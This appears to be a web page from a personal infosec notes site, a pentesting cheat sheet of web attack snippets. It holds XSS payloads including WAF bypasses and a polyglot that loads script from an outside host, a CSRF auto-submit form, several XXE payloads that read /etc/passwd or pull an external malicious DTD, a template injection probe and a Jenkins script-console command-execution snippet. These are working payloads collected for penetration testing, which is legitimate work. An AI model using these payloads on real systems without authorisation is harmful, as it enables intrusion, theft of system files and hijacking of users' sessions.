<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>ovelny - chaos/web-exploitation/web-snippets-and-commands</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta
      name="description"
      content="ovelny - notes on infosec, penetration testing, programming and others"
    />
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="stylesheet" type=text/css href="/assets/css/dead-simple.min.css">
    <link rel="stylesheet" type=text/css href="/assets/css/rouge.min.css">
    <link
      href="/atom.xml"
      rel="alternate"
      title="ovelny"
      type="application/atom+xml"
    />
    <script src="/assets/js/scramble-text.min.js" defer></script>
    <script src="/assets/js/zoom-images.min.js" defer></script>
    <meta name="twitter:card" content="summary"/>
    <meta name="twitter:site" content="@ovelny"/>
    <meta name="twitter:title" content="ovelny - chaos/web-exploitation/web-snippets-and-commands"/>
    <meta name="twitter:image" content="https://ovelny.sh/assets/images/ovelny-logo.png"/>
    <meta name="twitter:image:alt" content="ovelny logo: 6 white circles grouped together forming a triangle shape, with a black background."/>
  </head>
  <body>

    <header>
      <section>
        <a href="/">
          <img
            class="logo"
            src="/assets/images/ovelny-pfp.png"
            alt="ovelny profile picture: a glitched picture of a three-eyed girl, staring intensely at the viewer."
          />
        </a>
        <h2><a class="ovelny" href="/">ovelny</a></h2>
      </section>
      <nav>
        <a href="/">home</a>
        <a href="/chaos/">chaos</a>
        <a href="/phasm/">phasm</a>
        <a href="/support/">support</a>
        <a href="/atom.xml" target="_blank" rel="noopener noreferrer">rss</a>
        <a href="/about/">about</a>
      </nav>
    </header>
    <main>

    
    <h1>web snippets and commands</h1>

<p>snippets and commands for web pentesting.</p>

<h2>enumeration</h2>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># filter dirsearch json output by status code using jq:</span>
jq <span class="s1">'.["&lt;ip_address&gt;"][] | select(.status | tostring | test("20*"))'</span> dirsearch.json

<span class="c"># fuzz subdomains with ffuf</span>
ffuf <span class="nt">-u</span> https://website.com/ <span class="nt">-w</span> yourlist <span class="nt">-H</span> <span class="s2">"Host: FUZZ.website.com"</span>
</code></pre></div>

<h3>querying the database type and version</h3>

<table><thead>
<tr>
<th>database type</th>
<th>query</th>
</tr>
</thead><tbody>
<tr>
<td>microsoft, mySQL</td>
<td><code>SELECT @@version</code></td>
</tr>
<tr>
<td>oracle</td>
<td><code>SELECT * (or BANNER) FROM v$version</code></td>
</tr>
<tr>
<td>postgreSQL</td>
<td><code>SELECT version()</code></td>
</tr>
</tbody></table>

<h2>exploitation</h2>

<h3>XSS</h3>

<div class="highlight"><pre class="highlight javascript"><code><span class="c1">// a solid XSS payload that bypasses imperva WAF</span>
<span class="o">&lt;</span><span class="nx">a</span><span class="o">/</span><span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)</span><span class="dl">"</span> <span class="o">/&gt;</span><span class="nx">click</span>

<span class="c1">// imperva bypass 2020</span>
<span class="o">&lt;</span><span class="nx">a</span><span class="o">/</span><span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='test'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)</span><span class="dl">"</span> <span class="o">/&gt;</span><span class="nx">tap</span>

<span class="c1">// add your payload as a hash in the URL and eval it</span>
<span class="nf">eval</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span> <span class="c1">// with something like url.com/#alert(1) somewhere</span>

<span class="c1">// polyglots</span>
<span class="dl">'</span><span class="s1">"onclick=(co</span><span class="se">\</span><span class="s1">u006efirm)?.`0`&gt;&lt;sVg/i="${{2&gt;1}}"oNload=(pro</span><span class="se">\</span><span class="s1">u006dpt)`1`&gt;&lt;/svG/&lt;/sTyle/&lt;/scripT/&lt;/textArea/&lt;/iFrame/&lt;/noScript/&lt;/seLect/--&gt;&lt;h1&gt;&lt;iMg/srC/onerror=alert`2`&gt;%22%3E%3CSvg/onload=confirm`3`//&lt;Script/src=//xhzeem.xSs.ht&gt;&lt;/scripT&gt;
</span></code></pre></div>

<h3>CSRF</h3>

<div class="highlight"><pre class="highlight html"><code><span class="c">&lt;!-- basic CSRF template example --&gt;</span>
<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"$method"</span> <span class="na">action=</span><span class="s">"$url"</span><span class="nt">&gt;</span>
     <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">value=</span><span class="s">"evil@evil.com"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;script&gt;</span>
      <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">submit</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div>

<h3>XML</h3>

<div class="highlight"><pre class="highlight xml"><code><span class="c">&lt;!-- basic XXE to call with &amp;xxe; --&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</span> ]&gt;

<span class="c">&lt;!-- typical external DTD to exiltrate data via error messages --&gt;</span>
<span class="cp">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</span>
<span class="cp">&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;</span>"&gt;
%eval;
%error;
<span class="c">&lt;!-- then fetch your external DTD from the target and interpret it inline --&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "http://url-of-external-dtd.com/malicious.dtd"&gt;</span> %xxe;]&gt; 

<span class="c">&lt;!-- template for repurposing a local DTD --&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [
&lt;!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd"&gt;</span>
<span class="cp">&lt;!ENTITY % entity_from_schemadtd '
&lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;</span>
<span class="cp">&lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;</span>"&gt;
<span class="ni">&amp;#x25;</span>eval;
<span class="ni">&amp;#x25;</span>error;
'&gt;
%local_dtd;
]&gt; 
<span class="c">&lt;!-- locating an existing DTD file to repurpose on the target --&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [
&lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt;</span>
%local_dtd;
]&gt; 

<span class="c">&lt;!-- example for XInclude attack --&gt;</span>
<span class="nt">&lt;foo</span> <span class="na">xmlns:xi=</span><span class="s">"http://www.w3.org/2001/XInclude"</span><span class="nt">&gt;</span>
<span class="nt">&lt;xi:include</span> <span class="na">parse=</span><span class="s">"text"</span> <span class="na">href=</span><span class="s">"file:///etc/passwd"</span><span class="nt">/&gt;&lt;/foo&gt;</span> 

<span class="c">&lt;!-- XXE via SVG file upload template --&gt;</span>
<span class="cp">&lt;?xml version="1.0" standalone="yes"?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "file:///etc/hostname" &gt;</span> ]&gt;<span class="nt">&lt;svg</span> <span class="na">width=</span><span class="s">"128px"</span> <span class="na">height=</span><span class="s">"128px"</span> <span class="na">xmlns=</span><span class="s">"http://www.w3.org/2000/svg"</span> <span class="na">xmlns:xlink=</span><span class="s">"http://www.w3.org/1999/xlink"</span> <span class="na">version=</span><span class="s">"1.1"</span><span class="nt">&gt;&lt;text</span> <span class="na">font-size=</span><span class="s">"16"</span> <span class="na">x=</span><span class="s">"0"</span> <span class="na">y=</span><span class="s">"16"</span><span class="nt">&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/text&gt;&lt;/svg&gt;</span> 
</code></pre></div>

<h3>template injection</h3>

<div class="highlight"><pre class="highlight html"><code><span class="c">&lt;!-- template injection test string --&gt;</span>
{{1+abcxx}}${1+abcxx}<span class="nt">&lt;</span><span class="err">%1+</span><span class="na">abcxx</span><span class="err">%</span><span class="nt">&gt;</span>[abcxx]
</code></pre></div>

<h3>jenkins</h3>

<div class="highlight"><pre class="highlight groovy"><code><span class="c1">// run system commands at http://jenkins-address/script</span>
<span class="kt">def</span> <span class="n">sout</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuffer</span><span class="o">(),</span> <span class="n">serr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuffer</span><span class="o">()</span>
<span class="kt">def</span> <span class="n">proc</span> <span class="o">=</span> <span class="s1">'[INSERT COMMAND]'</span><span class="o">.</span><span class="na">execute</span><span class="o">()</span>
<span class="n">proc</span><span class="o">.</span><span class="na">consumeProcessOutput</span><span class="o">(</span><span class="n">sout</span><span class="o">,</span> <span class="n">serr</span><span class="o">)</span>
<span class="n">proc</span><span class="o">.</span><span class="na">waitForOrKill</span><span class="o">(</span><span class="mi">1000</span><span class="o">)</span>
<span class="n">println</span> <span class="s2">"out&gt; $sout err&gt; $serr"</span>
</code></pre></div>

<h3>graphQL</h3>

<div class="highlight"><pre class="highlight graphql"><code><span class="s2">"""</span><span class="w">
</span>introspection query<span class="w">
</span><span class="s2">"""</span><span class="w">
</span><span class="k">query</span><span class="w"> </span><span class="n">IntrospectionQuery</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="n">__schema</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="n">queryType</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="p">}</span><span class="w">
      </span><span class="n">mutationType</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="p">}</span><span class="w">
      </span><span class="n">types</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="p">...</span><span class="n">FullType</span><span class="w">
      </span><span class="p">}</span><span class="w">
      </span><span class="n">directives</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="n">name</span><span class="w">
        </span><span class="n">description</span><span class="w">
        </span><span class="n">locations</span><span class="w">
        </span><span class="n">args</span><span class="w"> </span><span class="p">{</span><span class="w">
          </span><span class="p">...</span><span class="n">InputValue</span><span class="w">
        </span><span class="p">}</span><span class="w">
      </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">}</span><span class="w">
  </span><span class="k">fragment</span><span class="w"> </span><span class="n">FullType</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">__Type</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="n">kind</span><span class="w">
    </span><span class="n">name</span><span class="w">
    </span><span class="n">description</span><span class="w">
    </span><span class="n">fields</span><span class="p">(</span><span class="n">includeDeprecated</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="n">name</span><span class="w">
      </span><span class="n">description</span><span class="w">
      </span><span class="n">args</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="p">...</span><span class="n">InputValue</span><span class="w">
      </span><span class="p">}</span><span class="w">
      </span><span class="n">type</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="p">...</span><span class="n">TypeRef</span><span class="w">
      </span><span class="p">}</span><span class="w">
      </span><span class="n">isDeprecated</span><span class="w">
      </span><span class="n">deprecationReason</span><span class="w">
    </span><span class="p">}</span><span class="w">
    </span><span class="n">inputFields</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="p">...</span><span class="n">InputValue</span><span class="w">
    </span><span class="p">}</span><span class="w">
    </span><span class="n">interfaces</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="p">...</span><span class="n">TypeRef</span><span class="w">
    </span><span class="p">}</span><span class="w">
    </span><span class="n">enumValues</span><span class="p">(</span><span class="n">includeDeprecated</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="n">name</span><span class="w">
      </span><span class="n">description</span><span class="w">
      </span><span class="n">isDeprecated</span><span class="w">
      </span><span class="n">deprecationReason</span><span class="w">
    </span><span class="p">}</span><span class="w">
    </span><span class="n">possibleTypes</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="p">...</span><span class="n">TypeRef</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">}</span><span class="w">
  </span><span class="k">fragment</span><span class="w"> </span><span class="n">InputValue</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">__InputValue</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="n">name</span><span class="w">
    </span><span class="n">description</span><span class="w">
    </span><span class="n">type</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">...</span><span class="n">TypeRef</span><span class="w"> </span><span class="p">}</span><span class="w">
    </span><span class="n">defaultValue</span><span class="w">
  </span><span class="p">}</span><span class="w">
  </span><span class="k">fragment</span><span class="w"> </span><span class="n">TypeRef</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">__Type</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="n">kind</span><span class="w">
    </span><span class="n">name</span><span class="w">
    </span><span class="n">ofType</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="n">kind</span><span class="w">
      </span><span class="n">name</span><span class="w">
      </span><span class="n">ofType</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="n">kind</span><span class="w">
        </span><span class="n">name</span><span class="w">
        </span><span class="n">ofType</span><span class="w"> </span><span class="p">{</span><span class="w">
          </span><span class="n">kind</span><span class="w">
          </span><span class="n">name</span><span class="w">
          </span><span class="n">ofType</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="n">kind</span><span class="w">
            </span><span class="n">name</span><span class="w">
            </span><span class="n">ofType</span><span class="w"> </span><span class="p">{</span><span class="w">
              </span><span class="n">kind</span><span class="w">
              </span><span class="n">name</span><span class="w">
              </span><span class="n">ofType</span><span class="w"> </span><span class="p">{</span><span class="w">
                </span><span class="n">kind</span><span class="w">
                </span><span class="n">name</span><span class="w">
                </span><span class="n">ofType</span><span class="w"> </span><span class="p">{</span><span class="w">
                  </span><span class="n">kind</span><span class="w">
                  </span><span class="n">name</span><span class="w">
                </span><span class="p">}</span><span class="w">
              </span><span class="p">}</span><span class="w">
            </span><span class="p">}</span><span class="w">
          </span><span class="p">}</span><span class="w">
        </span><span class="p">}</span><span class="w">
      </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span></code></pre></div>

    
    </main>
    <footer id="footer">
      <div class="footer-section"><a href="/license/">CC BY-NC-SA 4.0</a><p>&nbsp;::&nbsp;2019 - 2025 ovelny</p></div>
      <div class="footer-section">「七転び八起き」</div>
    </footer>
  </body>
</html>

